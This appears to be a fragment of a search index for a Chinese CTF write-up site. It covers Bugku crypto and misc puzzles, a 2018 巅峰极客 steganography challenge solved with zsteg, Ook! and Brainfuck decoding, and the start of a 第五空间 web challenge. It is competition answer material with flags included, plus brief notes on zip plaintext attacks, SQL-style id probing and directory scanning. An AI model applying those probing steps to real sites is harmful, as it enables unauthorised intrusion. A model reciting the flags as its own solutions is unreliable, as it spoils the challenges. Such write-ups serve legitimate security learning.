18, 29)\" : \"50 Rouge Neon - Bright Red (Satin)\" , \"rgb(235, 85, 71)\" : \"51 Corail Urbain - Medium Peach Orange (Satin)\" , \"rgb(246, 98, 96)\" : \"52 Rosy Coral - Rosy Coral (Satin)\" , \"rgb(126, 69, 58)\" : \"53 Beige Promenade - Browd Red (Satin)\" , \"rgb(94, 35, 41)\" : \"54 Prune Avenue - Dark Maroon (Satin)\" , \"rgb(193, 9, 43)\" : \"56 Orange Indie - Mauve (Satin)\" , \"rgb(192, 8, 62)\" : \"57 Luminous Pink - Magenta (Satin)\" , \"rgb(165, 63, 103)\" : \"58 Luminous Mauve - Bubblegum Pink (Satin)\" , \"rgb(212, 122, 111)\" : \"59 Golden Melon - Golden Orange (Satin)\" , \"rgb(170, 64, 64)\" : \"66 Rosewood - Soft Pink Nude (Satin)\" , \"rgb(220, 53, 77)\" : \"67 Rouge Heroine - Gold Metallic (Satin)\" , \"rgb(203, 132, 123)\" : \"70 Le Nu - Basic Nude (Satin)\" , \"rgb(148, 23, 41)\" : \"72 Rouge Vinyle - Deep Raspberry (Satin)\" , \"rgb(215, 11, 22)\" : \"73 Rhythm Red - Magenta Pink (Satin)\" , \"rgb(229, 35, 23)\" : \"74 Orange Electro - Electric Orange (Satin)\" , \"rgb(183, 48, 62)\" : \"75 Rose Mix - Deep Rose (Satin)\" , \"rgb(209, 50, 116)\" : \"76 Explicit Pink - Spring Pink (Satin)\" , \"rgb(206, 10, 74)\" : \"77 Fuschia Live - Blush Rose (Satin)\" , \"rgb(161, 0, 6)\" : \"201 Orange Imagine - Orange Red (Matte)\" , \"rgb(161, 0, 52)\" : \"202 Rose Crazy - Cranberry Red (Matte)\" , \"rgb(167, 11, 35)\" : \"203 Rouge Rock - Rich Red (Matte)\" , \"rgb(131, 35, 37)\" : \"204 Rouge Scandal - Maroon Red (Matte)\" , \"rgb(97, 37, 29)\" : \"206 Grenat Satisfaction - Brown Red (Matte)\" , \"rgb(184, 20, 70)\" : \"208 Fuchsia Fetiche - Raspberry Red (Matte)\" , \"rgb(231, 51, 37)\" : \"213 Orange Seventies - Orange with Brown undertones (Matte)\" , \"rgb(215, 91, 89)\" : \"214 Wood On Fire - Pinky Nude (Matte)\" , \"rgb(184, 38, 59)\" : \"216 Red Clash - Mauvey Red (Matte)\" , \"rgb(201, 88, 108)\" : \"217 Nude Trouble - Mauvey Beige (Matte)\" , \"rgb(203, 93, 70)\" : \"218 Coral Remix - Coral Nude (Matte)\" , \"rgb(195, 1, 9)\" : \"219 Rouge Tatouage \u2013 Vibrant Pink Red (Matte)\" , \"rgb(230, 26, 1)\" : \"220 Crazy Tangerine \u2013 Electric Orange (Matte)\" , \"rgb(106, 19, 25)\" : \"222 Black Red Code \u2013 Rust Red (Matte)\" , \"rgb(51, 26, 19)\" : \"225 - Minimal Black - Matte Finish - Black (Matte)\" , \"rgb(165, 106, 92)\" : \"340 Golden Copper - Reddish Pink (Satin)\" , \"rgb(163, 77, 86)\" : \"09 Rose Stiletto - Rich Berry Rose (Satin)\" , \"rgb(92, 47, 44)\" : \"205 Prune Virgin - Burgundy (Matte)\" , \"rgb(174, 67, 95)\" : \"207 Rose Perfecto - Blush Pink (Matte)\" , \"rgb(226, 0, 74)\" : \"211 Decadent Pink - Bright Pink (Matte)\" , \"rgb(126, 32, 50)\" : \"212 Alternative Plum - Burgundy Wine (Matte)\" , \"rgb(207, 44, 125)\" : \"215 Lust For Pink - Purple Bubblegum Pink (Matte)\" , \"rgb(214, 0, 112)\" : \"221 Rose Ink \u2013 Deep Mauve Pink (Matte)\" , \"rgb(232, 11, 44)\" : \"223 Corail Anti-Mainstream \u2013 Neon Coral (Matte)\" , \"rgb(219, 90, 121)\" : \"224 Rose Illicite \u2013 Creamy Dusty Pink (Matte)\" } \u53d6\u8272\uff1a 1 2 3 4 5 6 7 8 from PIL import Image im = Image . open ( '603fda27-2893-4e60-9d9f-39962b8c8440.png' ) rgb_im = im . convert ( 'RGB' ) for x in range ( 0 , 21 ): r , g , b = rgb_im . getpixel (( 50 + ( 150 * x ), 1 )) print ( r , g , b ) \u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 (188, 11, 40) (208, 65, 121) (212, 122, 111) (194, 105, 111) (235, 130, 98) (207, 26, 119) (192, 8, 62) (188, 11, 40) (188, 11, 40) (209, 50, 116) (106, 19, 25) (188, 11, 40) (188, 11, 40) (212, 18, 29) (215, 91, 89) (221, 136, 133) (206, 10, 74) (212, 18, 29) (126, 69, 58) (215, 91, 89) (221, 136, 133) \u67e5\u627e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ IFS=$'\\n'; for i in `cat image-colors` ; do grep $i ./lipsticks.json >> found; done $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' 1 27 59 11 23 7 57 1 1 76 222 1 1 50 214 6 77 50 53 214 6 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | tr -d '\\n' 1275911237571176222115021467750532146 1 2 $ cat found | cut -d: -f1 | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' 1011111101011111001011100010101000101100011010100101010111001000111001010101101011100 1 2 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' | perl -lpe '$_=pack\"B*\",$_' \u767d\u5b66\u5bb6 \u6700\u540e\u5f97\u5230\u5bc6\u7801","title":"\u591a\u5f69"},{"location":"writeup/bugku/#isccctf","text":"636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067 \u5341\u516d\u8fdb\u5236\u89e3\u7801\uff1a 1 cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g base64\u89e3\u7801 1 r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM \u8fd9\u4e32\u4e1c\u897f\u5c31\u9700\u8981\u4e00\u70b9\u8111\u6d1e\uff0c\u8fd9\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u5bf9\u7167\u7740\u952e\u76d8\uff0c\u6bd4\u5982r5yg\uff0c\u56f4\u8d77\u6765\u7684\u662ft\uff0clp9i\u56f4\u8d77\u6765\u7684\u662fo\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6700\u540e\u5f97\u51fatongyuan\uff08\u63d0\u4ea4flag\u7684\u65f6\u5019\u63d0\u4ea4\u5927\u5199\u7684TONGYUAN\uff09","title":"\u544a\u8bc9\u4f60\u4e2a\u79d8\u5bc6(ISCCCTF)"},{"location":"writeup/bugku/#md5","text":"","title":"\u8fd9\u4e0d\u662fmd5"},{"location":"writeup/bugku/#_2","text":"@iH<,{bdR2H;i6*Tm,Wx2izpx2! \u5206\u6790\uff1a\u9898\u76ee\u8bf4\u662f\u8d1d\u65af(base)\uff0c\u90a3\u5e94\u8be5\u662fbase\u7f16\u7801\u4e4b\u7c7b\u7684\uff0c\u7136\u540e\u6211\u8bd5\u4e86\u4e0bbase64\uff0c\u53d1\u73b0\u4e0d\u5bf9\uff0c\u540e\u6765\u4e86\u89e3\u5230base\u7f16\u7801\u4e0d\u6b62\u6709base64\uff0c\u8fd8\u6709base16,base32\uff0cbase58\uff0cbase62\uff0cbase91\u7b49\uff0c\u90fd\u8bd5\u4e86\u4e00\u904d\uff0c\u53d1\u73b0\u8fd9\u9898\u662f\u7528base91\u89e3\u7801 Github\u4e0a\u627e\u5230\u7684js \u4ee3\u7801","title":"\u8d1d\u65af\u5bb6\u65cf"},{"location":"writeup/bugku/#_3","text":"","title":"\u5bcc\u5f3a\u6c11\u4e3b"},{"location":"writeup/bugku/#_4","text":"\u8fd9\u79cd\u4e1c\u897f\u53eb\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd\uff0c\u767e\u5ea6\u627e\u5230\u5bf9\u7167\u8868","title":"\u6765\u81ea\u5b87\u5b99\u7684\u4fe1\u53f7"},{"location":"writeup/bugku/#_5","text":"\u5bc6\u6587\uff1a -... -.- -.-. - ..-. -- .. ... -.-.","title":"\u6ef4\u7b54~\u6ef4"},{"location":"writeup/bugku/#_6","text":"\u6805\u680f\u5bc6\u7801\u89e3\u5bc6","title":"\u806a\u660e\u7684\u5c0f\u7f8a"},{"location":"writeup/bugku/#ok","text":"","title":"ok"},{"location":"writeup/bugku/#_7","text":"","title":"\u8fd9\u4e0d\u662f\u83ab\u5c14\u65af\u5bc6\u7801"},{"location":"writeup/bugku/#easy-crypto","text":"","title":"easy Crypto"},{"location":"writeup/bugku/#_8","text":"\u4e00\u4e2a\u4e2a\u8bd5\u4e00\u4e0b\u5427","title":"\u7b80\u5355\u52a0\u5bc6"},{"location":"writeup/bugku/#_9","text":"\u4e00\u5f20\u56fe\u7247\uff1a","title":"\u6765\u81ea\u4e4c\u4e91\u7684\u9080\u8bf7\u7801"},{"location":"writeup/bugku/#_10","text":"zip\u7684\u660e\u6587\u653b\u51fb","title":"\u795e\u79d8\u7684\u6587\u4ef6"},{"location":"writeup/bugku/#_11","text":"jpg\u683c\u5f0f\uff0cstrings\u770b\u5230\u4e00\u4e32\u4e8c\u8fdb\u5236\u7684\u6570\u636e burp\u53ef\u4ee5\u5b9e\u73b0\u8fde\u7eed\u7684\u52a0\u5bc6\u548c\u89e3\u5bc6","title":"\u8bba\u5251"},{"location":"writeup/bugku/#misc","text":"","title":"misc"},{"location":"writeup/bugku/#_12","text":"\u4fee\u6539\u9ad8\u5ea6","title":"\u9690\u5199"},{"location":"writeup/bugku/#telnet","text":"\u7b80\u5355\u5730\u6d41\u91cf\u5206\u6790","title":"telnet"},{"location":"writeup/bugku/#_13","text":"\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\uff0cfile\u67e5\u770b\u683c\u5f0f\u77e5\u9053\u662fzip\uff0c\u89e3\u538b\u7f29\u4e4b\u540e\u53c8\u662fword\uff0c \u89e3\u538b\u540e\u53bb\u627e\u5c31\u884c","title":"\u773c\u89c1\u975e\u5b9e"},{"location":"writeup/bugku/#_14","text":"binwalk \u56fe\u7247\u5c5e\u6027\u6709\u5bc6\u7801","title":"\u554a\u54d2"},{"location":"writeup/bugku/#_15","text":"foremost","title":"\u53c8\u4e00\u5f20\u56fe\u7247"},{"location":"writeup/bugku/#_17","text":"\u591a\u5f69wp wp wp","title":"\u53c2\u8003"},{"location":"writeup/dianfengjike2018/","text":"\u5dc5\u5cf0\u6781\u5ba2 \u00b6 warmup \u00b6 LSB\u9690\u5199 \u00b6 \u8fd9\u90e8\u5206\u77e5\u8bc6\u5c31\u4e0d\u7ec6\u8bf4\u4e86 \u5b9a\u4f4d\u9690\u5199\u70b9 \u00b6 \u6d4f\u89c8\u4e0d\u540c\u7684\u901a\u9053 Red plane 0 Green plane 0 Blue plane 0 \u6458\u53d6\u9690\u5199\u4fe1\u606f \u00b6 \u5982\u6cd5\u70ae\u5236\u5f97\u5230\u4e0d\u540c\u901a\u9053\u7684\u4fe1\u606f \u6362\u4e00\u79cd\u65b9\u5f0f \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ zsteg -h Usage: zsteg [options] filename.png [param_string] -c, --channels X channels (R/G/B/A) or any combination, comma separated valid values: r,g,b,a,rg,rgb,bgr,rgba,... -l, --limit N limit bytes checked, 0 = no limit (default: 256) -b, --bits N number of bits (1..8), single value or '1,3,5' or '1-8' --lsb least significant BIT comes first --msb most significant BIT comes first -P, --prime analyze/extract only prime bytes/pixels -a, --all try all known methods -o, --order X pixel iteration order (default: 'auto') valid values: ALL,xy,yx,XY,YX,xY,Xy,bY,... -E, --extract NAME extract specified payload, NAME is like '1b,rgb,lsb' -v, --verbose Run verbosely (can be used multiple times) -q, --quiet Silent any warnings (can be used multiple times) -C, --[no-]color Force (or disable) color output (default: auto) PARAMS SHORTCUT zsteg fname.png 2b,b,lsb,xy ==> --bits 2 --channel b --lsb --order xy \u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a 1 2 3 $ zsteg warmup.bmp --bits 1 --channel r --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel g --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel b --lsb --order xy --limit 2048 --bits 1 \uff1a\u6bcf\u6b21\u53ea\u6458\u53d6\u989c\u8272\u901a\u9053\u4e2d\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u3002 --channel r \uff1a\u53ea\u6458\u53d6\u7ea2\u8272\u901a\u9053\u7684\u6bd4\u7279\u4f4d\u3002 --lsb \uff1a\u6309\u6700\u4f4e\u6709\u6548\u4f4d\u4f18\u5148\u7684\u987a\u5e8f\u8fdb\u884c\u6458\u53d6\u3002 --order xy \uff1a\u6309\u7167\u4ece\u5de6\u81f3\u53f3\u3001\u4ece\u4e0a\u81f3\u4e0b\u7684\u987a\u5e8f\u5bf9\u56fe\u50cf\u7d20\u70b9\u8fdb\u884c\u6458\u53d6\u3002 --limit 2048 \uff1a\u6700\u591a\u6458\u53d6\u8f93\u51fa 2048 \u5b57\u8282\u3002 zsteg warmup.bmp --all \u53ef\u4ee5\u81ea\u52a8\u5c1d\u8bd5\u6240\u6709\u7684\u65b9\u5f0f Short Ook! \u00b6 \u7531 red.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 ..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!... ..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?. ..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!!! !!!!! !!!.! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!! !!?.? !.?!! !!!!! !!!!! !!!!! .!!!! !.!!! !!!!! !.... ..... !.!!! ..... ..!.! !!!!! !!!!! !!!!! !!!.? . \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Short Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 flag{db640436- \uff1a Ook! \u00b6 \u7531 green.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 O \u5927\u5199\u5b57\u6bcd O 79\uff08\\x4F\uff09 k \u5c0f\u5199\u5b57\u6bcd k 107\uff08\\x6B\uff09 o \u5c0f\u5199\u5b57\u6bcd o 111\uff08\\x6F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 7839-4050-8339 \uff1a Brainfuck \u00b6 \u7531 blue.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 +++++ +[->+ +++++ <]>++ +++++ ++.<+ ++[-> +++<] >+.-- .<+++ +++[- >++++ ++<]> +++++ +++.< +++++ +[->- ----- <]>-- --.-- .---- -.<++ +++++ [->++ +++++ <]>++ +.--- .<+++ +++[- >---- --<]> ----- ----- ..--. <++++ ++[-> +++++ +<]>+ +++++ +++++ +.<++ +++[- >++++ +<]>+ .< \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Brainfuck \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 + \u52a0\u53f7 43\uff08\\x2B\uff09 - \u51cf\u53f7 45\uff08\\x2D\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 < \u5c0f\u4e8e\u53f7 60\uff08\\x3C\uff09 > \u5927\u4e8e\u53f7 62\uff08\\x3E\uff09 [ \u5de6\u65b9\u62ec\u53f7 91\uff08\\x5B\uff09 ] \u53f3\u65b9\u62ec\u53f7 93\uff08\\x5D\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 -75a972fc553c} \uff1a loli \u00b6 \u8fd9\u91cc\u6709\u4e2a\u63d0\u793a 255\uff0c\u4e5f\u5c31\u662f 0xFF\u3002 \u63a5\u7740\u7528 010 editor \u6253\u5f00\u56fe\u7247\u53d1\u73b0\u6587\u4ef6\u672b\u5c3e\u591a\u4e86\u4e00\u5757\u3002 \u53c2\u8003 \u00b6 \u89e3\u7801\u7f51\u7ad9 \u5dc5\u5cf0\u6781\u5ba2 \u5dc5\u5cf0\u6781\u5ba22","title":"\u5dc5\u5cf0\u6781\u5ba2"},{"location":"writeup/dianfengjike2018/#_1","text":"","title":"\u5dc5\u5cf0\u6781\u5ba2"},{"location":"writeup/dianfengjike2018/#warmup","text":"","title":"warmup"},{"location":"writeup/dianfengjike2018/#lsb","text":"\u8fd9\u90e8\u5206\u77e5\u8bc6\u5c31\u4e0d\u7ec6\u8bf4\u4e86","title":"LSB\u9690\u5199"},{"location":"writeup/dianfengjike2018/#_2","text":"\u6d4f\u89c8\u4e0d\u540c\u7684\u901a\u9053 Red plane 0 Green plane 0 Blue plane 0","title":"\u5b9a\u4f4d\u9690\u5199\u70b9"},{"location":"writeup/dianfengjike2018/#_3","text":"\u5982\u6cd5\u70ae\u5236\u5f97\u5230\u4e0d\u540c\u901a\u9053\u7684\u4fe1\u606f","title":"\u6458\u53d6\u9690\u5199\u4fe1\u606f"},{"location":"writeup/dianfengjike2018/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ zsteg -h Usage: zsteg [options] filename.png [param_string] -c, --channels X channels (R/G/B/A) or any combination, comma separated valid values: r,g,b,a,rg,rgb,bgr,rgba,... -l, --limit N limit bytes checked, 0 = no limit (default: 256) -b, --bits N number of bits (1..8), single value or '1,3,5' or '1-8' --lsb least significant BIT comes first --msb most significant BIT comes first -P, --prime analyze/extract only prime bytes/pixels -a, --all try all known methods -o, --order X pixel iteration order (default: 'auto') valid values: ALL,xy,yx,XY,YX,xY,Xy,bY,... -E, --extract NAME extract specified payload, NAME is like '1b,rgb,lsb' -v, --verbose Run verbosely (can be used multiple times) -q, --quiet Silent any warnings (can be used multiple times) -C, --[no-]color Force (or disable) color output (default: auto) PARAMS SHORTCUT zsteg fname.png 2b,b,lsb,xy ==> --bits 2 --channel b --lsb --order xy \u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a 1 2 3 $ zsteg warmup.bmp --bits 1 --channel r --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel g --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel b --lsb --order xy --limit 2048 --bits 1 \uff1a\u6bcf\u6b21\u53ea\u6458\u53d6\u989c\u8272\u901a\u9053\u4e2d\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u3002 --channel r \uff1a\u53ea\u6458\u53d6\u7ea2\u8272\u901a\u9053\u7684\u6bd4\u7279\u4f4d\u3002 --lsb \uff1a\u6309\u6700\u4f4e\u6709\u6548\u4f4d\u4f18\u5148\u7684\u987a\u5e8f\u8fdb\u884c\u6458\u53d6\u3002 --order xy \uff1a\u6309\u7167\u4ece\u5de6\u81f3\u53f3\u3001\u4ece\u4e0a\u81f3\u4e0b\u7684\u987a\u5e8f\u5bf9\u56fe\u50cf\u7d20\u70b9\u8fdb\u884c\u6458\u53d6\u3002 --limit 2048 \uff1a\u6700\u591a\u6458\u53d6\u8f93\u51fa 2048 \u5b57\u8282\u3002 zsteg warmup.bmp --all \u53ef\u4ee5\u81ea\u52a8\u5c1d\u8bd5\u6240\u6709\u7684\u65b9\u5f0f","title":"\u6362\u4e00\u79cd\u65b9\u5f0f"},{"location":"writeup/dianfengjike2018/#short-ook","text":"\u7531 red.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 ..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!... ..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?. ..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!!! !!!!! !!!.! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!! !!?.? !.?!! !!!!! !!!!! !!!!! .!!!! !.!!! !!!!! !.... ..... !.!!! ..... ..!.! !!!!! !!!!! !!!!! !!!.? . \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Short Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 flag{db640436- \uff1a","title":"Short Ook!"},{"location":"writeup/dianfengjike2018/#ook","text":"\u7531 green.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 O \u5927\u5199\u5b57\u6bcd O 79\uff08\\x4F\uff09 k \u5c0f\u5199\u5b57\u6bcd k 107\uff08\\x6B\uff09 o \u5c0f\u5199\u5b57\u6bcd o 111\uff08\\x6F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 7839-4050-8339 \uff1a","title":"Ook!"},{"location":"writeup/dianfengjike2018/#brainfuck","text":"\u7531 blue.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 +++++ +[->+ +++++ <]>++ +++++ ++.<+ ++[-> +++<] >+.-- .<+++ +++[- >++++ ++<]> +++++ +++.< +++++ +[->- ----- <]>-- --.-- .---- -.<++ +++++ [->++ +++++ <]>++ +.--- .<+++ +++[- >---- --<]> ----- ----- ..--. <++++ ++[-> +++++ +<]>+ +++++ +++++ +.<++ +++[- >++++ +<]>+ .< \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Brainfuck \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 + \u52a0\u53f7 43\uff08\\x2B\uff09 - \u51cf\u53f7 45\uff08\\x2D\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 < \u5c0f\u4e8e\u53f7 60\uff08\\x3C\uff09 > \u5927\u4e8e\u53f7 62\uff08\\x3E\uff09 [ \u5de6\u65b9\u62ec\u53f7 91\uff08\\x5B\uff09 ] \u53f3\u65b9\u62ec\u53f7 93\uff08\\x5D\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 -75a972fc553c} \uff1a","title":"Brainfuck"},{"location":"writeup/dianfengjike2018/#loli","text":"\u8fd9\u91cc\u6709\u4e2a\u63d0\u793a 255\uff0c\u4e5f\u5c31\u662f 0xFF\u3002 \u63a5\u7740\u7528 010 editor \u6253\u5f00\u56fe\u7247\u53d1\u73b0\u6587\u4ef6\u672b\u5c3e\u591a\u4e86\u4e00\u5757\u3002","title":"loli"},{"location":"writeup/dianfengjike2018/#_5","text":"\u89e3\u7801\u7f51\u7ad9 \u5dc5\u5cf0\u6781\u5ba2 \u5dc5\u5cf0\u6781\u5ba22","title":"\u53c2\u8003"},{"location":"writeup/fivespace/","text":"\u7b2c\u4e94\u7a7a\u95f4 \u00b6 \u7a7a\u76f8 \u00b6 \u968f\u624b\u8f93\u5165\u4e00\u4e2aid=1\u63d0\u793a\u4e0d\u884c \u52a0\u4e00\u4e2a\u7b26\u53f7\u5f97\u5230\u8fd9\u4e9b \u6ca1\u6709token \u626b\u76ee\u5f55\u53d1\u73b0\u4e86\u767b\u9646\u754c\u9762 